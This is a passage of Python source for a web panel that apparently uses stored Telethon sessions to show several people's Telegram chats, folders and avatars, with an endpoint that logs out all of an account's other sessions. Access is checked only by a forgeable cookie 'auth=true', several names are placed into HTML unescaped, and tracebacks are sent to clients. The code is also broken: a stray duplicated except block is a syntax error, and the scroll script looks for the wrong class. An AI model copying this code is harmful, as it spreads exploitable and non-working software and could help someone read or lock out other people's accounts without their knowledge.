                            }} catch(e) {{ }}
                        }}
                    }}, 1000);
                }} else {{
                    btn.style.background = '#ccc';
                    btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="12" r="3"/><rect width="20" height="14" x="2" y="5" rx="7"/></svg>';
                    if(statusIcon) {{ statusIcon.style.background = '#ccc'; statusIcon.innerHTML = 'Off'; }}
                    if(window.refreshCountdown) clearInterval(window.refreshCountdown);
                }}
            }}
        </script>
    </head>
    <body>
        <div class="action-bar">
            <button class="back-btn" onclick="location.href='/'"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left-icon lucide-arrow-left"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></button>
            <div style="flex:1;">
               <img src="/avatar/{user_id}" class="avatar" style="vertical-align:middle; margin-right:5px;">
               <span class="user-title">{display_name}</span>
            </div>
        </div>
        <div class="scroll-tabs">
            {tabs_html}
        </div>
        <div class="content-area">
            {content_html}
        </div>
    </body>
    </html>
    """
    return web.Response(text=html, content_type='text/html')

async def handle_user_folders_page(request):
    try:
        if request.cookies.get('auth') != 'true':
            raise web.HTTPFound('/login')
            
        user_id = request.match_info.get('user_id')
        active_sessions = request.app['active_sessions']
        history = get_history()
        uid_str = str(user_id)
        udata = history.get(uid_str, {})
        display_name = udata.get('custom_name') or udata.get('name', 'User')

        session = active_sessions.get(int(user_id))
        folders = []
        all_dialogs = []
        
        # Imports need to be inside checking loop or top level, usually top level is better but here is fine
        from telethon.tl.functions.messages import GetDialogFiltersRequest, GetPinnedDialogsRequest
        from telethon.tl.functions.account import GetNotifySettingsRequest
        from telethon.tl.types import DialogFilter, InputNotifyUsers, InputNotifyChats, InputNotifyBroadcasts
        from telethon import utils
        
        # Fetch Data
        defaults = {'users': False, 'groups': False, 'broadcasts': False}
        if session and session.client and session.client.is_connected():
            try:
                 # Fetch Global Notify Settings
                 try:
                     settings_u, settings_c, settings_b = await asyncio.gather(
                         session.client(GetNotifySettingsRequest(InputNotifyUsers())),
                         session.client(GetNotifySettingsRequest(InputNotifyChats())),
                         session.client(GetNotifySettingsRequest(InputNotifyBroadcasts()))
                     )
                     now_ts = datetime.now().timestamp()
                     def is_def_muted(s):
                         mu = getattr(s, 'mute_until', 0)
                         if isinstance(mu, datetime): mu = mu.timestamp()
                         return mu > now_ts
                     
                     defaults['users'] = is_def_muted(settings_u)
                     defaults['groups'] = is_def_muted(settings_c)
                     defaults['broadcasts'] = is_def_muted(settings_b)
                     
                     # Cache defaults for updates
                     session.notify_defaults = defaults
                 except Exception as ex:
                     logger.error(f"Failed to fetch global settings: {ex}")

                 # Fetch Filters
                 # Note: GetDialogFiltersRequest might fail if not supported or other error
                 res = await session.client(GetDialogFiltersRequest())
                 raw_list = res
                 if hasattr(res, 'filters'):
                     raw_list = res.filters
                 
                 folders = [f for f in raw_list if isinstance(f, DialogFilter)]
                 
                 # Fetch Pinned Dialogs for Folder 0 (All)
                 all_pinned_ids = None
                 try:
                     res_p = await session.client(GetPinnedDialogsRequest(folder_id=0))
                     all_pinned_ids = []
                     # res_p is messages.PeerDialogs
                     if hasattr(res_p, 'dialogs'):
                         for d in res_p.dialogs:
                             all_pinned_ids.append(utils.get_peer_id(d.peer))
                 except Exception as e:
                     logger.error(f"Pinned fetch error: {e}")

                 # Fetch Main Dialogs (Limit 500)
                 main_dialogs = []
                 async for d in session.client.iter_dialogs(folder=0, limit=500, ignore_migrated=True):
                     if d.archived: continue
                     main_dialogs.append(d)

                 # Fetch Archived Dialogs (Limit 200)
                 archived_dialogs = []
                 try:
                     async for d in session.client.iter_dialogs(folder=1, limit=200):
                         archived_dialogs.append(d)
                 except Exception as e:
                     logger.warning(f"Could not fetch archive: {e}")
                 
                 except Exception as e:
                     logger.warning(f"Could not fetch archive: {e}")
                 
                 # Pool for filtering (Main + Archive) - Deduplicate
                 filter_pool = []
                 seen_ids = set()
                 for d in main_dialogs + archived_dialogs:
                     try:
                         pid = utils.get_peer_id(d.entity)
                         if pid not in seen_ids:
                             filter_pool.append(d)
                             seen_ids.add(pid)
                     except: pass
                     
            except Exception as e:
                 logger.error(f"Error fetching data for folders: {e}")
                 pass
        
        # Helper to check if dialog matches filter
        def matches_filter(dialog, f):
            try:
                # 1. Exclude Logic
                peer_id = utils.get_peer_id(dialog.entity)
                
                # Check Excluded Peers
                for exc in f.exclude_peers:
                    if utils.get_peer_id(exc) == peer_id:
                        return False
                        
                # Check Exclude Flags
                if f.exclude_muted:
                    d_settings = getattr(dialog.dialog, 'notify_settings', None)
                    mute_until = getattr(d_settings, 'mute_until', 0) if d_settings else 0
                    if isinstance(mute_until, datetime): mute_until = mute_until.timestamp()
                    if mute_until and mute_until > datetime.now().timestamp(): return False
                
                if f.exclude_read and not dialog.unread_count: return False
                if f.exclude_archived and dialog.archived: return False
                
                # 2. Include Logic
                # Explicit include (pinned or included)
                for inc in f.include_peers + f.pinned_peers:
                    if utils.get_peer_id(inc) == peer_id:
                        return True
                        
                # Flags
                if f.contacts and dialog.is_user and getattr(dialog.entity, 'contact', False): return True
                if f.non_contacts and dialog.is_user and not getattr(dialog.entity, 'contact', False) and not getattr(dialog.entity, 'bot', False): return True
                if f.bots and dialog.is_user and getattr(dialog.entity, 'bot', False): return True
                if f.groups and dialog.is_group: return True
                if f.broadcasts and dialog.is_channel and not dialog.is_group: return True
            except:
                return False
            
            return False

        # Icons
        pin_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-pin-icon lucide-pin"><path d="M12 17v5"/><path d="M9 10.76a2 2 0 0 1-1.11 1.79l-1.78.9A2 2 0 0 0 5 15.24V16a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-.76a2 2 0 0 0-1.11-1.79l-1.78-.9A2 2 0 0 1 15 10.76V7a1 1 0 0 1 1-1 2 2 0 0 0 0-4H8a2 2 0 0 0 0 4 1 1 0 0 1 1 1z"/></svg>"""
        mute_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-volume-x-icon lucide-volume-x"><path d="M11 4.702a.705.705 0 0 0-1.203-.498L6.413 7.587A1.4 1.4 0 0 1 5.416 8H3a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h2.416a1.4 1.4 0 0 1 .997.413l3.383 3.384A.705.705 0 0 0 11 19.298z"/><line x1="22" x2="16" y1="9" y2="15"/><line x1="16" x2="22" y1="9" y2="15"/></svg>"""
        bookmark_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-bookmark-icon lucide-bookmark"><path d="M17 3a2 2 0 0 1 2 2v15a1 1 0 0 1-1.496.868l-4.512-2.578a2 2 0 0 0-1.984 0l-4.512 2.578A1 1 0 0 1 5 20V5a2 2 0 0 1 2-2z"/></svg>"""
        at_sign_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-at-sign-icon lucide-at-sign"><circle cx="12" cy="12" r="4"/><path d="M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-4 8"/></svg>"""
        check_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check-icon lucide-check"><path d="M20 6 9 17l-5-5"/></svg>"""
        double_check_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check-check-icon lucide-check-check"><path d="M18 6 7 17l-5-5"/><path d="m22 10-7.5 7.5L13 16"/></svg>"""
        voice_chat_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-audio-lines-icon lucide-audio-lines"><path d="M2 10v3"/><path d="M6 6v11"/><path d="M10 3v18"/><path d="M14 8v7"/><path d="M18 5v13"/><path d="M22 10v3"/></svg>"""



        # Prepare Content
        # All Chats
        # Local render_list removed. Using global render_dialog_list.

        mode_all = request.query.get('mode') == 'all'
        
        # Tabs Logic
        tabs_html = ""
        if not mode_all:
             uc_all = sum(1 for d in main_dialogs if getattr(d, 'unread_count', 0) > 0)
             all_name = "All"
             if uc_all > 0: all_name = f"All ({uc_all})"
             tabs_html = f'<div class="tab-item active" onclick="switchTab(this, \'All\')">{all_name}</div>'

        content_html = f'<div id="content-All" class="content-item active">{render_dialog_list(main_dialogs, user_id, defaults=defaults, pinned_ids=all_pinned_ids)}</div>'
        
        if folders and not mode_all:
            for f in folders:
                # Filter Dialogs
                f_dialogs = [d for d in filter_pool if matches_filter(d, f)]
                
                # Get Pinned IDs for sort
                pinned_ids = [utils.get_peer_id(p) for p in f.pinned_peers]
                
                name = getattr(f, 'title', 'Folder')
                if hasattr(name, 'text'): name = name.text
                name = str(name)
                
                uc_f = sum(1 for d in f_dialogs if getattr(d, 'unread_count', 0) > 0)
                if uc_f > 0: name = f"{name} ({uc_f})"
                
                safe_name = name.replace("'", "\\'").replace('"', '&quot;')
                tab_id = f"tab_{f.id}" # Use ID to avoid name collision/encoding issues
                
                tabs_html += f'<div class="tab-item" onclick="switchTab(this, \'{tab_id}\')">{name}</div>'
                content_html += f'<div id="content-{tab_id}" class="content-item" style="display:none;">{render_dialog_list(f_dialogs, user_id, defaults=defaults, pinned_ids=pinned_ids)}</div>'

        css = """
            body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; }
            .action-bar { position: relative; z-index: 100; height: 56px; box-sizing: border-box; background: #2481cc; color: white; padding: 0 10px; display: flex; align-items: center; gap: 10px; }
            .back-btn { 
                background: #3c94dd; border: none; color: white; width: 32px; height: 32px; 
                border-radius: 50%; display: flex; align-items: center; justify-content: center; 
                cursor: pointer; transition: background 0.15s; outline: none; flex-shrink: 0; padding: 0;
            }
            .back-btn:hover { background: #2f7bbc; }
            .back-btn svg { width: 18px; height: 18px; }
            .avatar { width: 40px; height: 40px; border-radius: 50%; background: #eee; border: 1px solid white; object-fit: cover; flex-shrink: 0; }
            .user-title { font-size: 18px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
            .scroll-tabs { background: #2481cc; display: flex; overflow-x: auto; white-space: nowrap; -webkit-overflow-scrolling: touch; position: sticky; top: 0; z-index: 99; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
            .scroll-tabs::-webkit-scrollbar { display: none; }
            .tab-item { padding: 14px 16px; color: rgba(255,255,255,0.7); font-weight: 500; font-size: 14px; cursor: pointer; border-bottom: 3px solid transparent; flex-shrink: 0; }
            .tab-item.active { color: white; border-bottom: 3px solid white; }
            
            .content-area { max-width: 800px; margin: 0 auto; }
            .chat-list { display: flex; flex-direction: column; }
            .chat-item { background: white; display: flex; align-items: center; padding: 5px 10px; border-bottom: 1px solid #f0f2f5; cursor: pointer; transition: background 0.2s; position: relative; height: 72px; box-sizing: border-box; }
            .chat-item:last-child { border-bottom: none; }
            .chat-item:hover { background: #f5f6f7; }
            
            .avatar-wrapper { position: relative; width: 54px; height: 54px; margin-right: 12px; flex-shrink: 0; }
            .chat-avatar { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; background: #eee; }
            .chat-icon { width: 100%; height: 100%; border-radius: 50%; background: #2481cc; color: white; display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 600; }
            
            .voice-badge { 
                position: absolute; bottom: -2px; right: -2px; 
                background: #4cd964; color: white; 
                width: 18px; height: 18px; border-radius: 50%; 
                display: flex; align-items: center; justify-content: center; 
                border: 1px solid #fff;
            }
            .voice-badge svg { width: 11px; height: 11px; }
            
            .chat-main { flex: 1; min-width: 0; display: flex; flex-direction: column; justify-content: center; }
            .chat-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2px; }
            .chat-name { font-size: 16px; font-weight: 600; color: #1c1e21; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 70%; }
            .chat-meta-right { display: flex; align-items: center; gap: 0px; font-size: 13px; color: #707579; }
            .chat-time { font-size: 12px; font-weight: 400; }
            
            .chat-body { display: flex; justify-content: space-between; align-items: center; }
            .chat-preview { font-size: 14px; color: #707579; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 70%; }
            .chat-badges { display: flex; align-items: center; gap: 4px; }
            
            .icon-badge { 
                min-width: 20px; height: 20px; border-radius: 10px; 
                display: flex; align-items: center; justify-content: center; 
                color: white; font-size: 12px; font-weight: 700; padding: 0 5px; box-sizing: border-box; 
            }
            .unread-badge { background: #3390ec; }
            .unread-badge.muted { background: #aaaaaa !important; } 
            .mention-badge { background: #3390ec; }
            .pinned-badge { background: #c4c4c4; color: white; width: 20px; padding: 0; transform: none; }
            .muted-badge { background: #c4c4c4; color: white; width: 20px; padding: 0; }
            
            .chat-tick { display: flex; align-items: center; color: #5fb440; }
            .chat-tick.read { color: #5fb440; }
            
            /* Overrides */
            .pinned-badge svg { width: 12px; height: 12px; transform: rotate(45deg); }
        """

        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{'All Chats' if mode_all else 'Chat Folders'} - {display_name}</title>
            <style>{css}</style>
            <script>
                const userId = "{user_id}";
                // Auto-update disabled


                function switchTab(el, id) {{
                    window.scrollTo(0, 0);
                    document.querySelectorAll('.tab-item').forEach(t => t.classList.remove('active'));
                    el.classList.add('active');
                    document.querySelectorAll('.content-item').forEach(c => c.style.display = 'none');
                    const content = document.getElementById('content-' + id);
                    if(content) content.style.display = 'block';
                }}
                
                let isLoading = false;
                window.onscroll = async function() {{
                    if(isLoading) return;
                    const b = document.body;
                    if((window.innerHeight + window.scrollY) >= b.offsetHeight - 500) {{
                         isLoading = true;
                         // Find active content
                         const active = Array.from(document.querySelectorAll('.tab-content')).find(c => c.style.display === 'block');
                         if(active) {{
                             const items = active.querySelectorAll('.chat-item');
                             if(items.length > 0) {{
                                 const last = items[items.length-1];
                                 const date = last.getAttribute('data-date');
                                 let fid = 0;
                                 if(active.id.startsWith('content-tab_')) fid = active.id.replace('content-tab_', '');
                                 
                                 if(date) {{
                                     try {{
                                         const res = await fetch(`/user/{user_id}/folders/more?folder_id=`+fid+`&offset_date=`+date);
                                         if(res.ok) {{
                                             const html = await res.text();
                                             if(html.trim().length > 0) {{
                                                 const list = active.querySelector('.chat-list');
                                                 if(list) list.insertAdjacentHTML('beforeend', html);
                                             }}
                                         }}
                                     }} catch(e) {{}}
                                 }}
                             }}
                         }}
                         setTimeout(() => isLoading = false, 1000);
                    }}
                }};
            </script>
        </head>
        <body>
            <div class="action-bar">
                <button class="back-btn" onclick="window.location.href='/user/{user_id}'"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left-icon lucide-arrow-left"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></button>
                <img src="/avatar/{user_id}" class="avatar">
                <div class="user-title">{display_name}</div>
            </div>
            <div class="scroll-tabs">
                {tabs_html}
            </div>
            <div class="content-area">
                {content_html}
            </div>
        </body>
        </html>
        """
        return web.Response(text=html, content_type='text/html')
    except Exception as e:
        import traceback
        tb = traceback.format_exc()
        logger.error(f"Error serving folders page: {e}", exc_info=True)
        return web.Response(text=f"Internal Server Error: {e}\n\n{tb}", status=500)

async def handle_peer_avatar(request):
    try:
        user_id = int(request.match_info.get('user_id'))
        peer_id = int(request.match_info.get('peer_id'))
        
        active_sessions = request.app['active_sessions']
        session = active_sessions.get(user_id)
        
        if not session or not session.client or not session.client.is_connected():
            return web.Response(status=404)
            
        import io
        out = io.BytesIO()
        # Download profile photo (small) by integer ID
        # Telethon handles integer ID if it's in cache or common.
        await session.client.download_profile_photo(peer_id, out, download_big=False)
        out.seek(0)
        
        if out.getbuffer().nbytes == 0:
            return web.Response(status=404)
            
        return web.Response(body=out.read(), content_type='image/jpeg')
    except Exception:
        return web.Response(status=404)

async def handle_terminate_sessions(request):
    cookie = request.cookies.get('auth')
    if cookie != 'true':
        return web.HTTPUnauthorized()
    
    data = await request.post()
    user_id = data.get('user_id')
    
    active_sessions = request.app['active_sessions'].get(int(user_id)) if user_id and user_id.isdigit() else None
    
    if active_sessions and active_sessions.client and active_sessions.client.is_connected():
        try:
             await active_sessions.client(ResetAuthorizationsRequest())
             return web.json_response({'status': 'ok'})
        except Exception as e:
             logger.error(f"Terminate error: {e}")
             return web.json_response({'status': 'error', 'message': str(e)}, status=500)
    return web.json_response({'status': 'error', 'message': 'Session not active'}, status=400)

def render_dialog_list(d_list, user_id, defaults=None, pinned_ids=None):
    from telethon import utils
    from datetime import datetime, timedelta
    
    pin_svg = """<svg xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 24 24" height="16px" viewBox="0 0 24 24" width="16px" fill="#707579"><g><rect fill="none" height="24" width="24"/><rect fill="none" height="24" width="24"/></g><g><path d="M19,12.87c0-0.47-0.34-0.85-0.8-0.98C16.93,11.54,16,10.38,16,9V4l1,0 c0.55,0,1-0.45,1-1c0-0.55-0.45-1-1-1H7C6.45,2,6,2.45,6,3c0,0.55,0.45,1,1,1l1,0v5c0,1.38-0.93,2.54-2.2,2.89 C5.34,12.02,5,12.4,5,12.87V13c0,0.55,0.45,1,1,1h4.98L11,21c0,0.55,0.45,1,1,1c0.55,0,1-0.45,1-1l-0.02-7H18c0.55,0,1-0.45,1-1 V12.87z" fill-rule="evenodd"/></g></svg>"""
    mute_svg = """<svg xmlns="http://www.w3.org/2000/svg" height="20px" viewBox="0 0 24 24" width="20px" fill="#707579"><path d="M7 10v4c0 .55.45 1 1 1h3l3.29 3.29c.63.63 1.71.18 1.71-.71V6.41c0-.89-1.08-1.34-1.71-.71L11 9H8c-.55 0-1 .45-1 1z"/></svg>"""
    bookmark_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-bookmark-icon lucide-bookmark"><path d="M17 3a2 2 0 0 1 2 2v15a1 1 0 0 1-1.496.868l-4.512-2.578a2 2 0 0 0-1.984 0l-4.512 2.578A1 1 0 0 1 5 20V5a2 2 0 0 1 2-2z"/></svg>"""
    at_sign_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-at-sign-icon lucide-at-sign"><circle cx="12" cy="12" r="4"/><path d="M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-4 8"/></svg>"""
    check_svg = """<svg xmlns="http://www.w3.org/2000/svg" height="16px" viewBox="0 0 24 24" width="16px" fill="#707579"><path d="M0 0h24v24H0V0z" fill="none"/><path d="M9 16.2l-3.5-3.5c-.39-.39-1.01-.39-1.4 0-.39.39-.39 1.01 0 1.4l4.19 4.19c.39.39 1.02.39 1.41 0L20.3 7.7c.39-.39.39-1.01 0-1.4-.39-.39-1.01-.39-1.4 0L9 16.2z"/></svg>"""
    double_check_svg = """<svg xmlns="http://www.w3.org/2000/svg" height="16px" viewBox="0 0 24 24" width="16px" fill="#4cd964"><path d="M0 0h24v24H0V0z" fill="none"/><path d="M17.3 6.3c-.39-.39-1.02-.39-1.41 0l-5.64 5.64 1.41 1.41L17.3 7.7c.38-.38.38-1.02 0-1.4zm4.24-.01l-9.88 9.88-3.48-3.47c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L22.95 7.71c.39-.39.39-1.02 0-1.41h-.01c-.38-.4-1.01-.4-1.4-.01zM1.12 14.12L5.3 18.3c.39.39 1.02.39 1.41 0l.7-.7-4.88-4.9c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.03 0 1.42z"/></svg>"""
    voice_chat_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-audio-lines-icon lucide-audio-lines"><path d="M2 10v3"/><path d="M6 6v11"/><path d="M10 3v18"/><path d="M14 8v7"/><path d="M18 5v13"/><path d="M22 10v3"/></svg>"""

    if not d_list: return ""
            
    # Sort
    pin_map = {pid: i for i, pid in enumerate(pinned_ids)} if pinned_ids else {}

    def sort_key(d):
        ts = 0
        if d.message and d.message.date: ts = d.message.date.timestamp()
        elif d.date: ts = d.date.timestamp()
        
        # If pinned_ids provided, use for sorting
        if pinned_ids:
            pid = utils.get_peer_id(d.entity)
            pin_idx = pin_map.get(pid, 99999)
            return (pin_idx, -ts)
        
        return -ts
    
    d_list.sort(key=sort_key)
    
    html = '<div class="chat-list">'
    for d in d_list:
        name = d.name or "Deleted Account"
        name = name.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        peer_id = utils.get_peer_id(d.entity)
        msg_text = ""
        sender_prefix = ""
        if d.message:
            if d.is_group and d.message.sender:
                try:
                    s_name = d.message.sender.first_name
                    if s_name: sender_prefix = f"<span style='color: #1c1e21; font-weight: 500;'>{s_name}: </span>"
                except: pass
            if d.message.message:
                msg_text = d.message.message[:50] + "..." if len(d.message.message) > 50 else d.message.message
                msg_text = msg_text.replace("\\n", " ")
            elif d.message.media: msg_text = "📷 Media"
        if not msg_text: msg_text = "No messages"
        full_msg_preview = sender_prefix + msg_text

        time_str = ""
        tick_icon = ""
        if d.message and d.message.date:
            try:
                dt = d.message.date + timedelta(hours=5, minutes=30)
                now = datetime.utcnow() + timedelta(hours=5, minutes=30)
                today = now.date(); msg_date = dt.date()
                if msg_date == today: time_str = dt.strftime("%I:%M %p").lstrip("0")
                elif (today - msg_date).days < 7: time_str = dt.strftime("%a")
                elif msg_date.year == today.year: time_str = dt.strftime("%b %d")
                else: time_str = dt.strftime("%d.%m.%y")
            except: pass
        
        if d.message and d.message.out:
            is_read = d.message.id <= d.dialog.read_outbox_max_id
            tick_icon = double_check_svg if is_read else check_svg
            # Remove Bg and formatting wraps to standard
            tick_icon = f'<div style="display:flex; align-items:center;">{f'<span class="chat-tick { "read" if is_read else "" }">{tick_icon}</span>'}</div>'

        d_settings = getattr(d.dialog, 'notify_settings', None)
        mute_until = getattr(d_settings, 'mute_until', None)
        is_silent = getattr(d_settings, 'silent', False)
        is_muted = False
        if mute_until:
             try:
                if isinstance(mute_until, datetime):
                    if mute_until.timestamp() > datetime.now().timestamp(): is_muted = True
                elif isinstance(mute_until, (int, float)):
                    if mute_until > datetime.now().timestamp(): is_muted = True
             except: pass
        if is_silent: is_muted = True
        if not is_muted and not mute_until and not is_silent and defaults:
            if d.is_group and defaults.get('groups'): is_muted = True
            elif d.is_channel and defaults.get('broadcasts'): is_muted = True
            elif d.is_user and defaults.get('users'): is_muted = True

        badges = []
        is_pinned = False
        if pinned_ids and peer_id in pinned_ids:
             is_pinned = True
             # Pin moved to Top Header (Meta Right)

        if d.unread_mentions_count > 0: badges.append(f'<div class="icon-badge mention-badge">{at_sign_svg}</div>')
        if d.unread_count > 0:
            badge_cls = "icon-badge unread-badge muted" if is_muted else "icon-badge unread-badge"
            badges.append(f'<div class="{badge_cls}">{d.unread_count}</div>')
        
        # Bottom Row: Only Mention and Counter. (Pin and Mute removed from here)

        # Top Row Logic: Time > Mute > Pin > Tick (User said: Time se pahle Mute, Us se pahle Pin, Us se pahle Tick)
        # HTML Order (Left to Right): Tick, Pin, Mute, Time.
        
        mute_html = f'<div style="display:flex; align-items:center;">{mute_svg}</div>' if is_muted else ""
        
        pin_html = ""
        if is_pinned:
             pin_html = f'<div style="transform: rotate(45deg); display:flex; align-items:center;">{pin_svg}</div>'
             
        badges_html = "".join(badges)

        voice_html = ""
        if getattr(d.entity, 'call_active', False):
             voice_html = f'<div class="voice-badge">{voice_chat_svg}</div>'

        inner_avatar = f'''<img src="/avatar/{user_id}/{peer_id}" class="chat-avatar" onerror="this.outerHTML='<div class=chat-icon>{name[:1]}</div>'">'''
        is_self = getattr(d.entity, 'is_self', False)
        if peer_id == int(user_id) or is_self:
            name = "Saved Messages"
            inner_avatar = f'<div class="chat-icon saved-msgs">{bookmark_svg}</div>'
        avatar_html = f'<div class="avatar-wrapper">{inner_avatar}{voice_html}</div>'

        html += f"""
        <div class="chat-item" data-date="{d.date.timestamp() if d.date else 0}" data-peer-id="{peer_id}" onclick="window.open('/user/{user_id}/chat/{peer_id}', '_blank')">
            {avatar_html}
            <div class="chat-main">
                <div class="chat-header">
                   <div class="chat-name">{name}</div>
                   <div class="chat-meta-right" style="display:flex; align-items:center; gap: 2px;">
                        {tick_icon}
                        {pin_html}
                        {mute_html}
                        <div class="chat-time">{time_str}</div>
                   </div>
                </div>
                <div class="chat-body">
                   <div class="chat-preview">{full_msg_preview}</div>
                   <div class="chat-badges">{badges_html}</div>
                </div>
            </div>
        </div>"""
    
    html += "</div>"
    return html

async def handle_load_more_dialogs(request):
    try:
        user_id = request.match_info.get('user_id')
        active_sessions = request.app['active_sessions']
        session = active_sessions.get(int(user_id))
        if not session or not session.client.is_connected(): return web.Response(status=404)

        from telethon.tl.functions.messages import GetDialogFiltersRequest
        from telethon.tl.types import DialogFilter
        from telethon import utils
        
        folder_id = int(request.query.get('folder_id', 0))
        offset_ts = float(request.query.get('offset_date', 0))
        offset_date = datetime.fromtimestamp(offset_ts) if offset_ts > 0 else None
        
        pin_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-pin-icon lucide-pin"><path d="M12 17v5"/><path d="M9 10.76a2 2 0 0 1-1.11 1.79l-1.78.9A2 2 0 0 0 5 15.24V16a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-.76a2 2 0 0 0-1.11-1.79l-1.78-.9A2 2 0 0 1 15 10.76V7a1 1 0 0 1 1-1 2 2 0 0 0 0-4H8a2 2 0 0 0 0 4 1 1 0 0 1 1 1z"/></svg>"""
        mute_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-volume-x-icon lucide-volume-x"><path d="M11 4.702a.705.705 0 0 0-1.203-.498L6.413 7.587A1.4 1.4 0 0 1 5.416 8H3a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h2.416a1.4 1.4 0 0 1 .997.413l3.383 3.384A.705.705 0 0 0 11 19.298z"/><line x1="22" x2="16" y1="9" y2="15"/><line x1="16" x2="22" y1="9" y2="15"/></svg>"""
        bookmark_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-bookmark-icon lucide-bookmark"><path d="M17 3a2 2 0 0 1 2 2v15a1 1 0 0 1-1.496.868l-4.512-2.578a2 2 0 0 0-1.984 0l-4.512 2.578A1 1 0 0 1 5 20V5a2 2 0 0 1 2-2z"/></svg>"""
        at_sign_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-at-sign-icon lucide-at-sign"><circle cx="12" cy="12" r="4"/><path d="M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-4 8"/></svg>"""
        check_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check-icon lucide-check"><path d="M20 6 9 17l-5-5"/></svg>"""
        double_check_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check-check-icon lucide-check-check"><path d="M18 6 7 17l-5-5"/><path d="m22 10-7.5 7.5L13 16"/></svg>"""
        voice_chat_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-audio-lines-icon lucide-audio-lines"><path d="M2 10v3"/><path d="M6 6v11"/><path d="M10 3v18"/><path d="M14 8v7"/><path d="M18 5v13"/><path d="M22 10v3"/></svg>"""

        main_dialogs = []
        async for d in session.client.iter_dialogs(folder=0, offset_date=offset_date, limit=50, ignore_migrated=True):
             main_dialogs.append(d)
        
        final_list = []
        if folder_id == 0:
